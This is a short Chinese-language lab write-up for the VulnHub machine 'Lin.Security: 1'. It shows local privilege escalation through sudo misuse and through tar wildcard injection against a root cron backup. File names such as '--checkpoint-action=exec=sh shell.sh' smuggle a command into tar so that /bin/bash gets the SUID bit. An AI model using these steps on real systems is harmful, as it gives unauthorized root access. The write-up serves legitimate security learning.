# Lin.Security: 1

2024-4-22 https://www.vulnhub.com/entry/linsecurity-1,244/

difficulty: easy to intermediate

## IP

192.168.10.174

## Scan

首先，靶场给我们提供了一个用户凭证：bob/secret，登陆后尝试进行多个攻击面的枚举，发现权限提升点。

sudo -l 发现 bob 用户有多个可以执行的 sudo 程序，可以直接使用 sudo /bin/bash 提升到 root 权限。其他的一些 SUDO 程序也可以进行权限提升，具体参考 https://gtfobins.github.io/ 中的使用方法，比较简单。

cat /etc/crontab 发现最后一行有一个以 root 用户执行的定时备份脚本，查看 /etc/cron.daily/backup 内容，发现是对/home 目录中的文件和文件目录进行定时备份，其中使用了 tar 命令，那么我们就能够利用 tar 在打包时，去执行特定的命令。

```bash
cd /home/bob
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >> --checkpoint=1

# tar 执行完毕后执行下面命令
/bin/bash -p
```
